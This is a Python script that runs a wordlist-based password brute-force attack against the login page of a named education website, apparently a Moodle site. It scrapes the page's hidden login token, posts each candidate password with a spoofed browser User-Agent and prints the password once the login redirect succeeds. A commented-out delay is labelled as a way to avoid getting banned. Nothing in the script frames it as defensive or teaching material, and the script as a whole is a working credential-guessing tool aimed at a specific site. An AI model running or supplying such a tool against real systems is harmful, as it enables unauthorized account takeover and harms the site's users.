import re
import time
import requests
import subprocess
from bs4 import BeautifulSoup
from multiprocessing import Pool

MAX_THREADS = 6
LOGIN_URL = "https://menofia.education/login/index.php"
USERNAME = ""
WORDLIST = "password.lst"

def line_count(filename):
    """
    count the number of lines in the wordlist 

    note : wc works only in linux
    """
    return int(subprocess.check_output(['wc', '-l', filename]).split()[0])

def login(password):
    """Spamming the login route"""

    session = requests.Session()

    page = session.get(LOGIN_URL)

    pattern = '<input type="hidden" name="logintoken" value="\w{32}">'

    token = re.findall(pattern, page.text)

    token = re.findall("\w{32}", token[0])

    data = {
        'username': USERNAME,
        'password': password,
        'anchor': "",
        'logintoken': token[0]
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'
    }

    # to avoid getting banned
    # time.sleep(1)

    resp = session.post(LOGIN_URL, data=data, headers=headers)

    return resp

def is_logged_in(url):
    """
    Checks if the response is OK after sending the POST request 

    if the url starts with : https://menofia.education/
        then OK

    else (https://menofia.education/login/index.php) :
        fail
    """

    if "login" not in url:
        return True

    return False

def main():
    print("Trying to crack the password")
    with open(WORDLIST) as passwords_file:
        for count, password in enumerate(passwords_file): 
            # removing the /n
            password = password[:-1]

            print(f"{count} - Trying password : {password}")

            # checking the password
            res = login(password)

            # checking if the login is successful 
            if is_logged_in(res.url):
                print(f"Login Success: Password is {password}, {count} tries.")
                break

if __name__ == '__main__':
    main()
